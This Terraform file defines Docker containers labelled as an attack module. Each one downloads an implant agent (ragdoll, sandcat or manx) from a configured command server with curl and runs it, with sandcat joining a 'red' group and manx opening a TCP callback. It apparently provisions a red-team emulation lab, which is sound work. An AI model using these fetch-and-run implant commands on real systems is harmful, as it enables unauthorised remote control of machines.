resource "docker_container" "ragdoll" {
  count = var.agent_type == "ragdoll" ? 1 : 0

  name  = "agent-ragdoll"
  image = "python:3.13-bookworm"

  labels {
    label = "module"
    value = "attack"
  }

  dynamic "networks_advanced" {
    for_each = var.network_external ? [1] : []
    content {
      name = "external"
    }
  }

  dynamic "networks_advanced" {
    for_each = var.network_internal ? [1] : []
    content {
      name = "internal"
    }
  }

  env = [
    "SERVER=http://${var.server_ip}:${var.server_port}",
    "CONTACT_HTML=weather"
  ]

  command = [
    "/bin/sh", "-c",
    "curl -s -X POST -H \"file:ragdoll.py\" -H \"platform:linux\" $SERVER/file/download > ragdoll.py; pip install requests beautifulsoup4; python ragdoll.py -W $SERVER/$CONTACT_HTML"
  ]
}

resource "docker_container" "sandcat" {
  count = var.agent_type == "sandcat" ? 1 : 0

  name  = "agent-sandcat"
  image = "python:3.13-bookworm"

  labels {
    label = "module"
    value = "attack"
  }

  dynamic "networks_advanced" {
    for_each = var.network_external ? [1] : []
    content {
      name = "external"
    }
  }
  
  dynamic "networks_advanced" {
    for_each = var.network_internal ? [1] : []
    content {
      name = "internal"
    }
  }

  env = [
    "SERVER=http://${var.server_ip}:${var.server_port}",
    "IMPLANT_NAME=${var.agent_param}"
  ]

  command = [
    "/bin/sh", "-c",
    "curl -s -X POST -H \"file:sandcat.go\" -H \"platform:linux\" $SERVER/file/download > $IMPLANT_NAME; chmod +x $IMPLANT_NAME; ./$IMPLANT_NAME -server $SERVER -group red -v"
  ]
}

resource "docker_container" "manx" {
  count = var.agent_type == "manx" ? 1 : 0

  name  = "agent-manx"
  image = "python:3.13-bookworm"

  labels {
    label = "module"
    value = "attack"
  }
  
  dynamic "networks_advanced" {
    for_each = var.network_external ? [1] : []
    content {
      name = "external"
    }
  }
  
  dynamic "networks_advanced" {
    for_each = var.network_internal ? [1] : []
    content {
      name = "internal"
    }
  }
  
  env = [
    "SERVER=http://${var.server_ip}:${var.server_port}",
    "SOCKET=${var.server_ip}:7010",
    "IMPLANT_NAME=${var.agent_param}"
  ]

  command = [
    "/bin/sh", "-c",
    "curl -s -X POST -H \"file:manx.go\" -H \"platform:linux\" $SERVER/file/download > $IMPLANT_NAME; chmod +x $IMPLANT_NAME; ./$IMPLANT_NAME -http $SERVER -socket $SOCKET -contact tcp -v"
  ]
}
